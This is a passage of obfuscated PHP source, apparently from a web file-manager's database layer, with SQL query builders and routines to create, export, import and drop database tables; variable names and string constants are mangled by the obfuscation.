$Å‹èÂ¢™ =& $_SERVER[”øäÃÍª]; return !empty($ÍŒèñßï) ? $Å‹èÂ¢™[1157] . $ÍŒèñßï . $Å‹èÂ¢™[1158] : $Å‹èÂ¢™[12]; } protected function parseDistinct($¤……¯—™) { $Öøúã =& $_SERVER[”øäÃÍª]; return !empty($¤……¯—™) ? $Öøúã[1159] : $Öøúã[12]; } protected function parseUnion($‡î®ã“) { $ïâãîæŸ =& $_SERVER[”øäÃÍª]; if (empty($‡î®ã“)) { return $ïâãîæŸ[12]; } if (isset($‡î®ã“[$ïâãîæŸ[423]])) { $ß¢ÍûÂ = $ïâãîæŸ[1160]; unset($‡î®ã“[$ïâãîæŸ[423]]); } else { $ß¢ÍûÂ = $ïâãîæŸ[1161]; } foreach ($‡î®ã“ as $×ŞÎšÊ) { $â—óÎ§[] = $ß¢ÍûÂ . (is_array($×ŞÎšÊ) ? $this->buildSelectSql($×ŞÎšÊ) : $×ŞÎšÊ); } return implode($ïâãîæŸ[53], $â—óÎ§); } public function insert($‰Í™ÜÆù, $ÄúÆ¾ñ× = array(), $ıó£ÓÉ = false) { $Úµ¬÷òõ =& $_SERVER[”øäÃÍª]; $è©Õé¬² = $ËÆ¿µ‹æ = array(); $this->model = $ÄúÆ¾ñ×[$Úµ¬÷òõ[359]]; foreach ($‰Í™ÜÆù as $Æõ›×È§ => $˜ØÑ—¦) { if (is_array($˜ØÑ—¦) && $Úµ¬÷òõ[372] == $˜ØÑ—¦[0]) { $ËÆ¿µ‹æ[] = $this->parseKey($Æõ›×È§); $è©Õé¬²[] = $˜ØÑ—¦[1]; } elseif (is_scalar($˜ØÑ—¦) || is_null($˜ØÑ—¦)) { $ËÆ¿µ‹æ[] = $this->parseKey($Æõ›×È§); $è©Õé¬²[] = $this->parseValue($˜ØÑ—¦); } } $Æˆ°ù¸á = ($ıó£ÓÉ ? $Úµ¬÷òõ[1026] : $Úµ¬÷òõ[1027]) . $Úµ¬÷òõ[1028] . $this->parseTable($ÄúÆ¾ñ×[$Úµ¬÷òõ[357]]) . $Úµ¬÷òõ[1022] . implode($Úµ¬÷òõ[50], $ËÆ¿µ‹æ) . $Úµ¬÷òõ[1023] . implode($Úµ¬÷òõ[50], $è©Õé¬²) . $Úµ¬÷òõ[1024]; $Æˆ°ù¸á .= $this->parseLock(isset($ÄúÆ¾ñ×[$Úµ¬÷òõ[963]]) ? $ÄúÆ¾ñ×[$Úµ¬÷òõ[963]] : !1); $Æˆ°ù¸á .= $this->parseComment(!empty($ÄúÆ¾ñ×[$Úµ¬÷òõ[429]]) ? $ÄúÆ¾ñ×[$Úµ¬÷òõ[429]] : $Úµ¬÷òõ[12]); return $this->execute($Æˆ°ù¸á, $this->parseBind(!empty($ÄúÆ¾ñ×[$Úµ¬÷òõ[361]]) ? $ÄúÆ¾ñ×[$Úµ¬÷òõ[361]] : array())); } public function selectInsert($Ö‚¯¹, $°¬áÒÀ, $òòĞ„ú = array()) { $¸‘¯§Á£ =& $_SERVER[”øäÃÍª]; $this->model = $òòĞ„ú[$¸‘¯§Á£[359]]; if (is_string($Ö‚¯¹)) { $Ö‚¯¹ = explode($¸‘¯§Á£[50], $Ö‚¯¹); } array_walk($Ö‚¯¹, array($this, $¸‘¯§Á£[1025])); $É§›Ïí = $¸‘¯§Á£[1162] . $this->parseTable($°¬áÒÀ) . $¸‘¯§Á£[1022] . implode($¸‘¯§Á£[50], $Ö‚¯¹) . $¸‘¯§Á£[1140]; $É§›Ïí .= $this->buildSelectSql($òòĞ„ú); return $this->execute($É§›Ïí, $this->parseBind(!empty($òòĞ„ú[$¸‘¯§Á£[361]]) ? $òòĞ„ú[$¸‘¯§Á£[361]] : array())); } public function update($‚¬©¥ñ¸, $—Ò´‘Ûã) { $È·¦ş…ñ =& $_SERVER[”øäÃÍª]; $this->model = $—Ò´‘Ûã[$È·¦ş…ñ[359]]; $°Îøê±¾ = $È·¦ş…ñ[1163] . $this->parseTable($—Ò´‘Ûã[$È·¦ş…ñ[357]]) . $this->parseSet($‚¬©¥ñ¸) . $this->parseWhere(!empty($—Ò´‘Ûã[$È·¦ş…ñ[353]]) ? $—Ò´‘Ûã[$È·¦ş…ñ[353]] : $È·¦ş…ñ[12]) . $this->parseOrder(!empty($—Ò´‘Ûã[$È·¦ş…ñ[441]]) ? $—Ò´‘Ûã[$È·¦ş…ñ[441]] : $È·¦ş…ñ[12]) . $this->parseLimit(!empty($—Ò´‘Ûã[$È·¦ş…ñ[368]]) ? $—Ò´‘Ûã[$È·¦ş…ñ[368]] : $È·¦ş…ñ[12]) . $this->parseLock(isset($—Ò´‘Ûã[$È·¦ş…ñ[963]]) ? $—Ò´‘Ûã[$È·¦ş…ñ[963]] : !1) . $this->parseComment(!empty($—Ò´‘Ûã[$È·¦ş…ñ[429]]) ? $—Ò´‘Ûã[$È·¦ş…ñ[429]] : $È·¦ş…ñ[12]); return $this->execute($°Îøê±¾, $this->parseBind(!empty($—Ò´‘Ûã[$È·¦ş…ñ[361]]) ? $—Ò´‘Ûã[$È·¦ş…ñ[361]] : array())); } public function delete($ŒÉ§”µ§ = array()) { $è¨‘Ÿ“ç =& $_SERVER[”øäÃÍª]; $this->model = $ŒÉ§”µ§[$è¨‘Ÿ“ç[359]]; $öºÏ×‹¤ = $è¨‘Ÿ“ç[1164] . $this->parseTable($ŒÉ§”µ§[$è¨‘Ÿ“ç[357]]) . $this->parseWhere(!empty($ŒÉ§”µ§[$è¨‘Ÿ“ç[353]]) ? $ŒÉ§”µ§[$è¨‘Ÿ“ç[353]] : $è¨‘Ÿ“ç[12]) . $this->parseOrder(!empty($ŒÉ§”µ§[$è¨‘Ÿ“ç[441]]) ? $ŒÉ§”µ§[$è¨‘Ÿ“ç[441]] : $è¨‘Ÿ“ç[12]) . $this->parseLimit(!empty($ŒÉ§”µ§[$è¨‘Ÿ“ç[368]]) ? $ŒÉ§”µ§[$è¨‘Ÿ“ç[368]] : $è¨‘Ÿ“ç[12]) . $this->parseLock(isset($ŒÉ§”µ§[$è¨‘Ÿ“ç[963]]) ? $ŒÉ§”µ§[$è¨‘Ÿ“ç[963]] : !1) . $this->parseComment(!empty($ŒÉ§”µ§[$è¨‘Ÿ“ç[429]]) ? $ŒÉ§”µ§[$è¨‘Ÿ“ç[429]] : $è¨‘Ÿ“ç[12]); return $this->execute($öºÏ×‹¤, $this->parseBind(!empty($ŒÉ§”µ§[$è¨‘Ÿ“ç[361]]) ? $ŒÉ§”µ§[$è¨‘Ÿ“ç[361]] : array())); } public function select($«ßÅêç = array()) { $»Äãë´« =& $_SERVER[”øäÃÍª]; $this->model = $«ßÅêç[$»Äãë´«[359]]; $Ÿ¸““­† = $this->buildSelectSql($«ßÅêç); $“şé›ÚÜ = isset($«ßÅêç[$»Äãë´«[424]]) ? $«ßÅêç[$»Äãë´«[424]] : !1; if ($“şé›ÚÜ) { $¿—úëî“ = is_string($“şé›ÚÜ[$»Äãë´«[95]]) ? $“şé›ÚÜ[$»Äãë´«[95]] : $»Äãë´«[1165] . md5($Ÿ¸““­†); $€ÃŠöÌ÷ = think_cache($¿—úëî“, $»Äãë´«[12], $“şé›ÚÜ); if (!1 !== $€ÃŠöÌ÷) { return $€ÃŠöÌ÷; } } $Š’†Ç = $this->query($Ÿ¸““­†, $this->parseBind(!empty($«ßÅêç[$»Äãë´«[361]]) ? $«ßÅêç[$»Äãë´«[361]] : array())); if ($“şé›ÚÜ && !1 !== $Š’†Ç) { think_cache($¿—úëî“, $Š’†Ç, $“şé›ÚÜ); } return $Š’†Ç; } public function buildSelectSql($ğè­×Àü = array()) { $Û§êº†Ş =& $_SERVER[”øäÃÍª]; if (isset($ğè­×Àü[$Û§êº†Ş[428]])) { if (strpos($ğè­×Àü[$Û§êº†Ş[428]], $Û§êº†Ş[50])) { list($ø‰àÜÎš, $İ–®Ì×) = explode($Û§êº†Ş[50], $ğè­×Àü[$Û§êº†Ş[428]]); } else { $ø‰àÜÎš = $ğè­×Àü[$Û§êº†Ş[428]]; } $ø‰àÜÎš = $ø‰àÜÎš ? $ø‰àÜÎš : 1; $İ–®Ì× = isset($İ–®Ì×) ? $İ–®Ì× : (is_numeric($ğè­×Àü[$Û§êº†Ş[368]]) ? $ğè­×Àü[$Û§êº†Ş[368]] : 20); $ò“æÒ¤¬ = $İ–®Ì× * ((int) $ø‰àÜÎš - 1); $ğè­×Àü[$Û§êº†Ş[368]] = $ò“æÒ¤¬ . $Û§êº†Ş[50] . $İ–®Ì×; } if (think_config($Û§êº†Ş[1166])) { $¦Üî¢õŒ = $Û§êº†Ş[1167] . md5(serialize($ğè­×Àü)); $¿Ó¸ÖÌ± = think_cache($¦Üî¢õŒ); if ($¿Ó¸ÖÌ±) { return $¿Ó¸ÖÌ±; } } $­›š±Å = $this->parseSql($this->selectSql, $ğè­×Àü); $­›š±Å .= $this->parseLock(isset($ğè­×Àü[$Û§êº†Ş[963]]) ? $ğè­×Àü[$Û§êº†Ş[963]] : !1); if (isset($¦Üî¢õŒ)) { think_cache($¦Üî¢õŒ, $­›š±Å); } return $­›š±Å; } public function parseSql($›ÖÈé·ó, $ÎøÅÑ¶Ù = array()) { $¨€§¿×‚ =& $_SERVER[”øäÃÍª]; $›ÖÈé·ó = str_replace(array($¨€§¿×‚[1168], $¨€§¿×‚[1169], $¨€§¿×‚[1170], $¨€§¿×‚[1171], $¨€§¿×‚[1172], $¨€§¿×‚[1173], $¨€§¿×‚[1174], $¨€§¿×‚[1175], $¨€§¿×‚[1176], $¨€§¿×‚[1177], $¨€§¿×‚[1178]), array($this->parseTable("{$ÎøÅÑ¶Ù[$¨€§¿×‚[357]]}"), $this->parseDistinct(isset($ÎøÅÑ¶Ù[$¨€§¿×‚[1179]]) ? $ÎøÅÑ¶Ù[$¨€§¿×‚[1179]] : !1), $this->parseField(!empty($ÎøÅÑ¶Ù[$¨€§¿×‚[351]]) ? $ÎøÅÑ¶Ù[$¨€§¿×‚[351]] : $¨€§¿×‚[220]), $this->parseJoin(!empty($ÎøÅÑ¶Ù[$¨€§¿×‚[360]]) ? $ÎøÅÑ¶Ù[$¨€§¿×‚[360]] : $¨€§¿×‚[12]), $this->parseWhere(!empty($ÎøÅÑ¶Ù[$¨€§¿×‚[353]]) ? $ÎøÅÑ¶Ù[$¨€§¿×‚[353]] : $¨€§¿×‚[12]), $this->parseGroup(!empty($ÎøÅÑ¶Ù[$¨€§¿×‚[606]]) ? $ÎøÅÑ¶Ù[$¨€§¿×‚[606]] : $¨€§¿×‚[12]), $this->parseHaving(!empty($ÎøÅÑ¶Ù[$¨€§¿×‚[1180]]) ? $ÎøÅÑ¶Ù[$¨€§¿×‚[1180]] : $¨€§¿×‚[12]), $this->parseOrder(!empty($ÎøÅÑ¶Ù[$¨€§¿×‚[441]]) ? $ÎøÅÑ¶Ù[$¨€§¿×‚[441]] : $¨€§¿×‚[12]), $this->parseLimit(!empty($ÎøÅÑ¶Ù[$¨€§¿×‚[368]]) ? $ÎøÅÑ¶Ù[$¨€§¿×‚[368]] : $¨€§¿×‚[12]), $this->parseUnion(!empty($ÎøÅÑ¶Ù[$¨€§¿×‚[422]]) ? $ÎøÅÑ¶Ù[$¨€§¿×‚[422]] : $¨€§¿×‚[12]), $this->parseComment(!empty($ÎøÅÑ¶Ù[$¨€§¿×‚[429]]) ? $ÎøÅÑ¶Ù[$¨€§¿×‚[429]] : $¨€§¿×‚[12])), $›ÖÈé·ó); return $›ÖÈé·ó; } public function getLastSql($Î¶·Ë”¸ = '') { return $Î¶·Ë”¸ ? $this->modelSql[$Î¶·Ë”¸] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($´ü¬ûéí) { return addslashes($´ü¬ûéí); } public function setModel($­‡ó†¬) { $this->model = $­‡ó†¬; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Ğ¾†Âùè = array()) { $Ïäúßöí =& $_SERVER[”øäÃÍª]; if (empty($Ğ¾†Âùè)) { $Ğ¾†Âùè = $GLOBALS[$Ïäúßöí[6]][$Ïäúßöí[21]]; } $this->database = $Ğ¾†Âùè; } public function model($ã‹®œª¤ = '') { return new ModelBase($ã‹®œª¤, $_SERVER[”øäÃÍª][12], $this->database); } public function db($àœºá® = false) { $…Äæ©‘ó =& $_SERVER[”øäÃÍª]; $‚ü™®² = array_change_key_case($this->database); if ($this->dbType() == $…Äæ©‘ó[13] || !$àœºá®) { return $this->model()->db(); } $î¤Î••é = $‚ü™®²[$…Äæ©‘ó[1094]]; $‚ü™®²[$…Äæ©‘ó[1094]] = $…Äæ©‘ó[12]; if ($‚ü™®²[$…Äæ©‘ó[1089]] == $…Äæ©‘ó[1086]) { $†É ´ªô = $‚ü™®²[$…Äæ©‘ó[1095]]; $‚ü™®²[$…Äæ©‘ó[1095]] = substr($†É ´ªô, 0, strrpos($†É ´ªô, $…Äæ©‘ó[1181])); } $this->database = $‚ü™®²; $À›ûß ¹ = $this->model()->db(); try { $Êóõ¸‡½ = $À›ûß ¹->execute("\x73\x68\x6f\x77\40\x64\x61\164\141\x62\141\x73\145\163\x20\154\151\x6b\145\x20\x27{$î¤Î••é}\47"); } catch (Exception $ÔÈÛîûø) { } if (!$Êóõ¸‡½) { $À›ûß ¹->execute("\143\x72\x65\x61\x74\x65\40\144\x61\x74\x61\142\x61\x73\145\40\140{$î¤Î••é}\140"); } $‚ü™®²[$…Äæ©‘ó[1094]] = $î¤Î••é; if ($‚ü™®²[$…Äæ©‘ó[1089]] == $…Äæ©‘ó[1086]) { $‚ü™®²[$…Äæ©‘ó[1095]] .= $…Äæ©‘ó[1181] . $î¤Î••é; } $this->database = $‚ü™®²; $À›ûß ¹->execute("\x75\x73\x65\x20\140{$î¤Î••é}\140"); return $À›ûß ¹; } public function createTable($±©‡æˆî, &$’á¯–…«) { $é€ÌæªÓ =& $_SERVER[”øäÃÍª]; if (!IO::exist($±©‡æˆî)) { show_json(LNG($é€ÌæªÓ[1182]), !1); } $ßîÈ¨Øœ = $this->model()->db(); $ƒ…ı»Ò£ = sqlSplit(IO::getContent($±©‡æˆî)); foreach ($ƒ…ı»Ò£ as $ÒŸÍ€Ì¥) { $»¼ËÒ×İ = stripos($ÒŸÍ€Ì¥, $é€ÌæªÓ[1183]) === 0; if ($»¼ËÒ×İ) { $’á¯–…«->task[$é€ÌæªÓ[1184]] += 1; } $ßîÈ¨Øœ->execute($ÒŸÍ€Ì¥); if ($»¼ËÒ×İ) { preg_match($é€ÌæªÓ[1185], $ÒŸÍ€Ì¥, $Ûè÷¨“Í); $’á¯–…«->task[$é€ÌæªÓ[1186]] = $Ûè÷¨“Í[1]; $’á¯–…«->update(1); } } } public function insertTable($çé’Î’ , &$À›¦–®¢) { $ò¨ñ×Ï =& $_SERVER[”øäÃÍª]; $®ÓÍ¹í„ = $this->model()->db(); $×¼Ô¶ØÛ = $Ùš²›Å† ? array($Ùš²›Å†) : $®ÓÍ¹í„->getTables(); foreach ($çé’Î’  as $ŞêÚÑµ‘) { $Ùš²›Å† = basename($ŞêÚÑµ‘, $ò¨ñ×Ï[901]); if (!in_array($Ùš²›Å†, $×¼Ô¶ØÛ)) { continue; } $À›¦–®¢->task[$ò¨ñ×Ï[1186]] = $Ùš²›Å†; if ($Ùš²›Å† == $ò¨ñ×Ï[472]) { continue; } if (get_filesize($ŞêÚÑµ‘) == 0) { continue; } $ÎÇÊõµ† = $this->sqlToDb($ŞêÚÑµ‘, $À›¦–®¢); if (!$ÎÇÊõµ†) { show_json(LNG($ò¨ñ×Ï[1187]) . "\x5b{$Ùš²›Å†}\x5d", !1); } } } public function sqlFromDb($ú˜§îã¢, $º«Û»ş, &$ªÖšÃî, $‡Öª¤† = '') { if ($ªÖšÃî) { $ªÖšÃî->task[$_SERVER[”øäÃÍª][1186]] = $ú˜§îã¢; } $­öÌ”î = $this->model($ú˜§îã¢); $üø¯ŠŠ¶ = 0; $œ••œ“à = 0; $à­Ï·‘ò = 10000; $ıö’Ô÷  = fopen($º«Û»ş, $_SERVER[”øäÃÍª][1188]); $¾°˜×¹× = $­öÌ”î->getPk(); $’ñ¢ÅŒÚ = $­öÌ”î->getDbFields(); $÷ÀÌé› = $_SERVER[”øäÃÍª][12]; if ($GLOBALS[$_SERVER[”øäÃÍª][900]] && in_array($ú˜§îã¢, array($_SERVER[”øäÃÍª][1189], $_SERVER[”øäÃÍª][1190]))) { $÷ÀÌé› = $ú˜§îã¢; } do { $‚Ïì¼ô = array($¾°˜×¹× => array($_SERVER[”øäÃÍª][1136], $œ••œ“à)); $áÅ°Åõ‹ = $­öÌ”î->where($‚Ïì¼ô)->field($’ñ¢ÅŒÚ)->order($¾°˜×¹× . $_SERVER[”øäÃÍª][1191])->limit($à­Ï·‘ò)->select(); $áÅ°Åõ‹ = !empty($áÅ°Åõ‹) ? $áÅ°Åõ‹ : array(); if (!($»³·Ù¿‹ = count($áÅ°Åõ‹))) { break; } $™˜·¥äÕ = end($áÅ°Åõ‹); $œ••œ“à = $™˜·¥äÕ[$¾°˜×¹×]; $ÕšãŠÓ = array(); foreach ($áÅ°Åõ‹ as $£¦ÂõŞ) { if ($÷ÀÌé›) { if ($ú˜§îã¢ == $_SERVER[”øäÃÍª][1189]) { if ($£¦ÂõŞ[$_SERVER[”øäÃÍª][33]] == $_SERVER[”øäÃÍª][1192]) { $üÉ»õ¢° = json_decode($£¦ÂõŞ[$_SERVER[”øäÃÍª][451]], !0); if ($üÉ»õ¢°[$_SERVER[”øäÃÍª][32]] == $GLOBALS[$_SERVER[”øäÃÍª][900]] && $üÉ»õ¢°[$_SERVER[”øäÃÍª][859]] != 1) { continue; } } } else { if ($£¦ÂõŞ[$_SERVER[”øäÃÍª][33]] == $_SERVER[”øäÃÍª][1193] && $£¦ÂõŞ[$_SERVER[”øäÃÍª][95]] == $_SERVER[”øäÃÍª][896]) { continue; } } } if ($‡Öª¤†) { $£¦ÂõŞ[$_SERVER[”øäÃÍª][87]] = "\x7b\x69\x6f\72{$‡Öª¤†}\x7d" . substr($£¦ÂõŞ[$_SERVER[”øäÃÍª][87]], strlen("\x7b\151\x6f\72{$£¦ÂõŞ[$_SERVER[”øäÃÍª][934]]}\175")); $£¦ÂõŞ[$_SERVER[”øäÃÍª][934]] = $‡Öª¤†; } $ÕšãŠÓ[] = $_SERVER[”øäÃÍª][1194] . $this->sqlEncode($£¦ÂõŞ) . $_SERVER[”øäÃÍª][1195]; } $×øÖä„ = "\x49\116\x53\105\x52\x54\40\111\x4e\124\x4f\40\140{$ú˜§îã¢}\140\x20\50\140" . implode($_SERVER[”øäÃÍª][1196], $’ñ¢ÅŒÚ) . $_SERVER[”øäÃÍª][1197]; fwrite($ıö’Ô÷ , $×øÖä„ . implode($_SERVER[”øäÃÍª][1198], $ÕšãŠÓ) . $_SERVER[”øäÃÍª][74] . PHP_EOL); $üø¯ŠŠ¶ += $»³·Ù¿‹; if ($ªÖšÃî) { $ªÖšÃî->update($»³·Ù¿‹); } } while ($à­Ï·‘ò == $»³·Ù¿‹); fclose($ıö’Ô÷ ); return $üø¯ŠŠ¶; } public function sqlToDb($Û ÅÉíƒ, &$—éõà¼Ñ) { $ƒ¤Ñßéó =& $_SERVER[”øäÃÍª]; $ÔÊŞÅø = $this->model()->db(); $˜£¥¢Ò = @fopen($Û ÅÉíƒ, $ƒ¤Ñßéó[1199]); if (!$˜£¥¢Ò) { return !1; } $ß³Ö“ª‚ = 0; $ÇÛÆ¬…’ = $ƒ¤Ñßéó[12]; $ºÛÎ°ù€ = array(); $Ûå×‹Ú = $this->dbType(); $¢Œ•¹Ä” = $Ûå×‹Ú == $ƒ¤Ñßéó[13] ? 500 : 2000; $£®«ğÖÓ = basename($Û ÅÉíƒ, $ƒ¤Ñßéó[901]); $¨©Ö×›Ü = 0; $ÎŸ°Äİ = 4194304; while (!feof($˜£¥¢Ò)) { $ î„õ¾Ö = trim(fgets($˜£¥¢Ò)); if (!$ î„õ¾Ö) { continue; } $êªöğË‰ = $this->sqlDecode($ î„õ¾Ö, $Ûå×‹Ú, $£®«ğÖÓ); if (stripos($êªöğË‰, $ƒ¤Ñßéó[430]) === 0) { if (!$ÇÛÆ¬…’) { $ÇÛÆ¬…’ = $êªöğË‰ . $ƒ¤Ñßéó[53]; } continue; } if ($—éõà¼Ñ) { $—éõà¼Ñ->task[$ƒ¤Ñßéó[1184]] += 1; } $ß³Ö“ª‚++; $ºÛÎ°ù€[] = rtrim(rtrim(trim($êªöğË‰), $ƒ¤Ñßéó[50]), $ƒ¤Ñßéó[74]); $½áÓ±Ö” = null; $±…”‹é = strlen($êªöğË‰); $¨©Ö×›Ü += $±…”‹é; $®“ÂŞ‰™ = strlen($ÇÛÆ¬…’) + $¨©Ö×›Ü + (count($ºÛÎ°ù€) - 1); if ($®“ÂŞ‰™ >= $ÎŸ°Äİ) { $½áÓ±Ö” = array_pop($ºÛÎ°ù€); if ($ß³Ö“ª‚ > 1) { $ß³Ö“ª‚--; } } if ($ß³Ö“ª‚ >= $¢Œ•¹Ä” || $½áÓ±Ö”) { $êªöğË‰ = $ÇÛÆ¬…’ . implode($ƒ¤Ñßéó[50], $ºÛÎ°ù€); if (!$ÔÊŞÅø->execute($êªöğË‰)) { return !1; } if ($—éõà¼Ñ) { $—éõà¼Ñ->update($ß³Ö“ª‚); } $ºÛÎ°ù€ = array(); $ß³Ö“ª‚ = 0; $¨©Ö×›Ü = 0; if ($½áÓ±Ö”) { $ºÛÎ°ù€ = array($½áÓ±Ö”); $ß³Ö“ª‚ = 1; $¨©Ö×›Ü = $±…”‹é; } } } fclose($˜£¥¢Ò); if (!empty($ºÛÎ°ù€)) { $êªöğË‰ = $ÇÛÆ¬…’ . implode($ƒ¤Ñßéó[50], $ºÛÎ°ù€); if (!$ÔÊŞÅø->execute($êªöğË‰)) { return !1; } if ($—éõà¼Ñ) { $—éõà¼Ñ->update($ß³Ö“ª‚); } } return !0; } public function dropTable($„Ôİ¨À™ = null) { $œŞ£µø =& $_SERVER[”øäÃÍª]; $¾ÕÈÉÕ§ = $this->model()->db(); $ãèğ·îŒ = $„Ôİ¨À™ ? array($„Ôİ¨À™) : $¾ÕÈÉÕ§->getTables(); if (!$ãèğ·îŒ) { return; } foreach ($ãèğ·îŒ as $„Ôİ¨À™) { if ($„Ôİ¨À™) { $„Ôİ¨À™ = strtolower($„Ôİ¨À™); } else { continue; } $¾ÕÈÉÕ§->execute($œŞ£µø[1200] . $this->escapeName($„Ôİ¨À™) . $œŞ£µø[1201]); } } private function sqlEncode($ˆ™öñÖÇ) { $ÂÆ¦ˆ³™ =& $_SERVER[”øäÃÍª]; $Æˆßûô = array(); foreach ($ˆ™öñÖÇ as $ÆğÚìÒ) { if (is_array($ÆğÚìÒ)) { $ÆğÚìÒ = json_encode_force($ÆğÚìÒ); } $ÆğÚìÒ = addslashes($ÆğÚìÒ); $ÆğÚìÒ = str_replace(array($ÂÆ¦ˆ³™[1202], $ÂÆ¦ˆ³™[285], $ÂÆ¦ˆ³™[417]), array($ÂÆ¦ˆ³™[1203], $ÂÆ¦ˆ³™[1204], $ÂÆ¦ˆ³™[1205]), $ÆğÚìÒ); $Æˆßûô[] = $ÆğÚìÒ; } return $ÂÆ¦ˆ³™[58] . implode($ÂÆ¦ˆ³™[1206], $Æˆßûô) . $ÂÆ¦ˆ³™[58]; } private function sqlDecode($™Üş³ø†, $ÈÌ•ñ‰æ, $û¦º´­ = '') { $õ—ìşµ =& $_SERVER[”øäÃÍª]; $™Üş³ø† = str_replace(array($õ—ìşµ[1203], $õ—ìşµ[1204], $õ—ìşµ[1205]), array($õ—ìşµ[1202], $õ—ìşµ[285], $õ—ìşµ[417]), $™Üş³ø†); if ($ÈÌ•ñ‰æ == $õ—ìşµ[13]) { $™Üş³ø† = str_ireplace($õ—ìşµ[1207], $õ—ìşµ[59], $™Üş³ø†); $™Üş³ø† = stripslashes($™Üş³ø†); } return preg_replace($õ—ìşµ[1208], $õ—ìşµ[12], $™Üş³ø†); if ($ÈÌ•ñ‰æ == $õ—ìşµ[13]) { return $û¦º´­ != $õ—ìşµ[472] ? stripslashes($™Üş³ø†) : $™Üş³ø†; } if ($û¦º´­ == $õ—ìşµ[472]) { $™Üş³ø† = str_replace($õ—ìşµ[1209], $õ—ìşµ[118], stripslashes($™Üş³ø†)); } return $™Üş³ø†; } public function getSqlFile($İ¿©Ã¨¥ = '') { $Ë±¸ÕÑ =& $_SERVER[”øäÃÍª]; $ÀÍ½ØşÆ = $this->dbType(!0); $šÀãƒ¡ = CONTROLLER_DIR . "\x69\156\163\164\141\x6c\154\57\144\141\x74\141\x2f{$ÀÍ½ØşÆ}\x2e\163\161\x6c"; if (!file_exists($šÀãƒ¡)) { return !1; } $ûÉâ˜¸ = file_get_contents($šÀãƒ¡); $’ºèä¿î = $Ë±¸ÕÑ[1210] . ($ÀÍ½ØşÆ == $Ë±¸ÕÑ[912] ? $Ë±¸ÕÑ[1211] : $Ë±¸ÕÑ[1212]) . $Ë±¸ÕÑ[1213]; preg_match_all($’ºèä¿î, $ûÉâ˜¸, $Âß’ëñ); $¼üƒ«§ = $Âß’ëñ[1]; $ÕìÕÆŸ÷ = $this->model()->db(); $õ®ª íÌ = $ÕìÕÆŸ÷->getTables(); $™éßÎ¦Ê = TEMP_FILES . $Ë±¸ÕÑ[1214] . date($Ë±¸ÕÑ[259]) . $Ë±¸ÕÑ[8]; del_dir($™éßÎ¦Ê); mk_dir($™éßÎ¦Ê); $ÙŸ ƒé = $™éßÎ¦Ê . $Ë±¸ÕÑ[1215]; $Û™ëÏÛö = $™éßÎ¦Ê . $Ë±¸ÕÑ[1216]; $Øß´ÇËî = $ÀÍ½ØşÆ == $Ë±¸ÕÑ[13] ? $Ë±¸ÕÑ[912] : $Ë±¸ÕÑ[13]; IO::copy(CONTROLLER_DIR . "\151\156\x73\x74\x61\154\154\x2f\x64\x61\x74\x61\57{$Øß´ÇËî}\x2e\x73\161\154", $™éßÎ¦Ê); @touch($™éßÎ¦Ê . $ÀÍ½ØşÆ . $Ë±¸ÕÑ[901]); $ù–ÀùŸí = fopen($ÙŸ ƒé, $Ë±¸ÕÑ[1188]); $ºø©ş¹ = fopen($Û™ëÏÛö, $Ë±¸ÕÑ[1188]); if ($ÀÍ½ØşÆ == $Ë±¸ÕÑ[13]) { $õ®ª íÌ = array_diff($õ®ª íÌ, array($Ë±¸ÕÑ[894], $Ë±¸ÕÑ[895])); $ú§÷İìÜ = array($Ë±¸ÕÑ[1217], $Ë±¸ÕÑ[1218], $Ë±¸ÕÑ[1219]); fwrite($ºø©ş¹, implode(PHP_EOL, $ú§÷İìÜ) . PHP_EOL . PHP_EOL); foreach ($õ®ª íÌ as $®­œŠİ) { $œƒâœ = $this->sqlFromSqlite($®­œŠİ); if (!$œƒâœ[$Ë±¸ÕÑ[13]]) { continue; } fwrite($ºø©ş¹, $œƒâœ[$Ë±¸ÕÑ[13]] . PHP_EOL . PHP_EOL); if (!in_array($®­œŠİ, $¼üƒ«§)) { fwrite($ù–ÀùŸí, $œƒâœ[$Ë±¸ÕÑ[912]] . PHP_EOL . PHP_EOL); } } } else { foreach ($õ®ª íÌ as $®­œŠİ) { $œƒâœ = $this->sqlFromMysql($®­œŠİ); if (!$œƒâœ[$Ë±¸ÕÑ[912]]) { continue; } fwrite($ù–ÀùŸí, $œƒâœ[$Ë±¸ÕÑ[912]] . PHP_EOL . PHP_EOL); if (!in_array($®­œŠİ, $¼üƒ«§)) { fwrite($ºø©ş¹, $œƒâœ[$Ë±¸ÕÑ[13]] . PHP_EOL . PHP_EOL); } } } fclose($ù–ÀùŸí); fclose($ºø©ş¹); $ûÉâ˜¸ = array($Ë±¸ÕÑ[912] => $ÙŸ ƒé, $Ë±¸ÕÑ[13] => $Û™ëÏÛö); return $İ¿©Ã¨¥ ? $ûÉâ˜¸[$İ¿©Ã¨¥] : $ûÉâ˜¸; } public function dbType($ÏÔÑã  = false) { $ëÖÖ¿» =& $_SERVER[”øäÃÍª]; $¿»â²’ = $ÏÔÑã  ? $GLOBALS[$ëÖÖ¿»[6]][$ëÖÖ¿»[21]] : $this->database; $¿»â²’ = array_change_key_case($¿»â²’); $åáŒÛ­Ì = $¿»â²’[$ëÖÖ¿»[1089]]; if ($åáŒÛ­Ì == $ëÖÖ¿»[1086]) { $î©î¨‘º = explode($ëÖÖ¿»[4], $¿»â²’[$ëÖÖ¿»[1095]]); $åáŒÛ­Ì = $î©î¨‘º[0]; } $£ï¤Üå = array($ëÖÖ¿»[1220] => $ëÖÖ¿»[13], $ëÖÖ¿»[1034] => $ëÖÖ¿»[912]); if (isset($£ï¤Üå[$åáŒÛ­Ì])) { $åáŒÛ­Ì = $£ï¤Üå[$åáŒÛ­Ì]; } return $åáŒÛ­Ì; } public function sqlFromMysql($·¬ÍÕ‚û, $‚Ã¨À = '') { $²‹Òíœæ =& $_SERVER[”øäÃÍª]; $¬‹µ’ÂÏ = array($²‹Òíœæ[912] => $²‹Òíœæ[12], $²‹Òíœæ[13] => $²‹Òíœæ[12]); $–¡òĞµÏ = $this->escapeName($·¬ÍÕ‚û); $¦áã½ö² = $this->escapeName($·¬ÍÕ‚û, $²‹Òíœæ[13]); $¥†¼ºÅ = $this->model()->db(); $Á›ê¨íê = $¥†¼ºÅ->query("\163\150\x6f\x77\40\143\x72\x65\141\164\x65\40\x74\141\142\154\145\40{$–¡òĞµÏ}\73"); if (!$Á›ê¨íê || !$Á›ê¨íê[0]) { return !1; } $„Š×šÆ» = _get($Á›ê¨íê[0], $²‹Òíœæ[1221], $²‹Òíœæ[12]); if (!$„Š×šÆ») { return !1; } 